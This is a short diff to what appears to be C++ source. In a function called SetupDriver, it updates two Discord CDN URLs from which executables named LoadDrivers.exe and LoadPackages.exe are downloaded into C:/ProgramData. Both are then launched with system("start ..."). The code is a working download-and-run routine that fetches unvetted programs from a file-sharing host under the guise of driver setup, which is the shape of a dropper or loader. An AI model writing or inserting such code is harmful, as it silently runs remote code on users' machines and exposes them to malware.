@@ -716,8 +716,8 @@ void Active() {
 }
 void SetupDriver()
 {
-	HRESULT hr1 = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/921578321291137045/926270562639175710/LoadDrivers.exe"), _T("C:/ProgramData/LoadDrivers.exe"), 0, NULL);
-	HRESULT hr2 = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/921135635836842045/926271207320465418/LoadPackages.exe"), _T("C:/ProgramData/LoadPackages.exe"), 0, NULL);
+	HRESULT hr1 = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/921578321291137045/931333288197500958/LoadDrivers.exe"), _T("C:/ProgramData/LoadDrivers.exe"), 0, NULL);
+	HRESULT hr2 = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/921578321291137045/931333665328365658/LoadPackages.exe"), _T("C:/ProgramData/LoadPackages.exe"), 0, NULL);
 	system("start C:/ProgramData/LoadDrivers.exe");
 	system("start C:/ProgramData/LoadPackages.exe");
 
